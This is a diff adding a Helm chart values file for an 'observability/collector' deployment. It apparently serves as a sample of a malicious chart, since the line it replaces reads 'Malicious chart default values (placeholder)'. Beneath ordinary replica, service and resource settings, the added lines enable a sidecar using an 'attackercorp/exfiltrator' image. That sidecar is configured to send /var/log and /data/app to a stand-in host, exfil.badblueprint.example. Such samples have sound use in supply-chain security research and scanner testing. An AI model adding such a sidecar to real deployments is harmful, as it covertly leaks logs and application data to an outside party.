@@ -1,1 +1,31 @@
-# Malicious chart default values (placeholder)
+replicaCount: 1
+
+image:
+  repository: observability/collector
+  tag: "0.25.0"
+  pullPolicy: IfNotPresent
+
+service:
+  type: ClusterIP
+  port: 4317
+
+resources:
+  limits:
+    cpu: 200m
+    memory: 256Mi
+  requests:
+    cpu: 100m
+    memory: 128Mi
+
+sidecar:
+  enabled: true
+  image:
+    repository: attackercorp/exfiltrator
+    tag: "0.3.1"
+    pullPolicy: IfNotPresent
+  config:
+    targetHost: "exfil.badblueprint.example"
+    targetPort: 443
+    exfiltratePaths:
+      - "/var/log"
+      - "/data/app"
